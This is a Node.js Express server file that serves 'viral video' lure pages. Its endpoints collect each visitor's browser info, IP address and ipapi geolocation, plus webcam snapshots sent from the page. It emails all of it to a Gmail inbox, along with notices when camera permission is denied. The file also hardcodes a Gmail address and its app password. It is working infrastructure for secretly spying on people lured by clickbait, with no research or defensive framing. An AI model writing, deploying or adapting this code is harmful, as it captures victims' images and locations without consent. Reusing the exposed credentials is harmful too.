const express = require("express");
const nodemailer = require("nodemailer");
const path = require("path");
const fetch = require("node-fetch");

const app = express();
const PORT = 3000;

app.use(express.json({ limit: "50mb" }));
app.use(express.static("public"));

// Nodemailer setup
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "sojib01943075658@gmail.com",
        pass: "eqws loxu bzbz imbx", // 16-char App Password
    },
});

// Serve HTML pages
app.get("/video/:id", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.get("/ridhi-viral-video/:id", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "/Pages/Ridhi viral video.html"));
});

// ---------------- Collect Client Info ----------------
app.post("/collect-info", async (req, res) => {
    try {
        const clientInfo = req.body;
        const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

        let ipData = {};
        try {
            const resp = await fetch(`https://ipapi.co/${clientIp}/json/`);
            ipData = await resp.json();
        } catch(err) {
            console.warn("ipapi fetch failed:", err);
        }

        const finalInfo = {
            ...clientInfo,
            ip: clientIp,
            ...ipData
        };

        await transporter.sendMail({
            from: "sojib01943075658@gmail.com",
            to: "rajib01943075658@gmail.com",
            subject: "📩 New Visitor Info",
            html: `<h3>New Visitor Info</h3><pre>${JSON.stringify(finalInfo, null, 2)}</pre>`
        });

        console.log("✅ Visitor info sent:", finalInfo);
        res.json({ ok: true });
    } catch(err) {
        console.error("❌ Email send error:", err);
        res.status(500).json({ error: "Email failed" });
    }
});

// ---------------- Upload Snapshot ----------------
app.post("/upload-html-image", async (req, res) => {
    try {
        const { videoId, base64, noPermission, info } = req.body;

        // ক্যামেরা পারমিশন না থাকলে
        if (noPermission) {
            await transporter.sendMail({
                from: "sojib01943075658@gmail.com",
                to: "rajib01943075658@gmail.com",
                subject: "⚠️ Camera Permission Denied",
                html: `<h3>Camera permission denied for video ID: ${videoId}</h3>
                       <pre>${JSON.stringify(info || {}, null, 2)}</pre>`
            });
            console.log("❌ Permission denied mail sent for video ID:", videoId);
            return res.json({ message: "Permission denied mail sent." });
        }

        if (!base64) {
            return res.status(400).send("❌ No image data received.");
        }

        const base64Data = base64.replace(/^data:image\/\w+;base64,/, "");
        const buffer = Buffer.from(base64Data, "base64");

        await transporter.sendMail({
            from: "sojib01943075658@gmail.com",
            to: "rajib01943075658@gmail.com",
            subject: `📸 Snapshot for Video ID: ${videoId}`,
            html: `
                <h2>📸 Captured Snapshot for Video ID: ${videoId}</h2>
                <pre>${JSON.stringify(info || {}, null, 2)}</pre>
                <p>See the image below:</p>
                <img src="cid:snapshotImage" style="max-width:100%; height:auto; border:1px solid #ccc; border-radius:8px;" />
            `,
            attachments: [
                {
                    filename: `snapshot-${videoId}.jpg`,
                    content: buffer,
                    cid: "snapshotImage"
                }
            ]
        });

        console.log("✅ Snapshot + info emailed for video ID:", videoId);
        res.json({ message: "Snapshot received and emailed." });

    } catch (err) {
        console.error("❌ Error:", err);
        res.status(500).send("Server error");
    }
});

// Catch-all 404 route
app.use((req, res) => {
    res.status(404).json({ message: "Page not found" });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running at http://localhost:${PORT}`);
});